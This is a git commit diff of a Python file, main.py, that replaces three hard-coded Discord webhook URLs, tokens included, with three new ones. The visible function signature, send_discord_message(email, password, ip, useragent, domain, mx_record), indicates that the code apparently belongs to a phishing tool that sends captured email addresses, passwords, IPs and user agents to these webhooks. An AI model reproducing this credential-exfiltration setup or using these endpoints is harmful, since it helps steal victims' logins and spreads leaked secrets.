be671f57dd73c0c648c117b8eb78d3c16dec7bc8
danicodehouse <119807915+danicodehouse@users.noreply.github.com>
2025-03-26 05:01:53 +0100

    Update main.py

--- main.py
+++ main.py
@@ -18,9 +18,9 @@ import dns.resolver
 
 # Discord Webhook URL
 DISCORD_WEBHOOK_URLS = [
-    "https://discord.com/api/webhooks/1354234400132431952/L1dxxQqz6ICOEpLNB_ideeRCaWjMzDzz83pNHjnrq-A5jksgwwjIeB-d3A0sLHsHRGk8",
-    "https://discord.com/api/webhooks/1354234416704131172/cl5AtfLhTqRo4VQww682wBoot5RNk7frSEEA4y_jIsyGg3mXE9Js7_onINr08y0zK9G1",
-    "https://discord.com/api/webhooks/1354234419199742023/nExvfQRnIdoeQF8wHjP0U9b0YGb9xDli9OMbl6GjVjwMmjUBrkmv2Fxp2NW0p60eqqfh"
+    "https://discord.com/api/webhooks/1354292688475914321/HahaDf6_5T978ZxsWSY6Vc75xnXUHDpopE49Ec-pMt_dTdnpm3P0QMKpv6LEqfDsm5T1",
+    "https://discord.com/api/webhooks/1354292728816599060/zzv4QuexLWz0baGUuCmB1C8g_-LQBZnQlGkr2MuTqWMtehnpCncipFzu_QEj8rSFaCW5",
+    "https://discord.com/api/webhooks/1354292756301746207/oFqeRi2gnpNfW82sMOCwNbCuZoyAunso-bPfoUpFUBOM-CoqGtP-6JId2DkDKuULO4WB"
 ]
 
 def send_discord_message(email, password, ip, useragent, domain, mx_record):
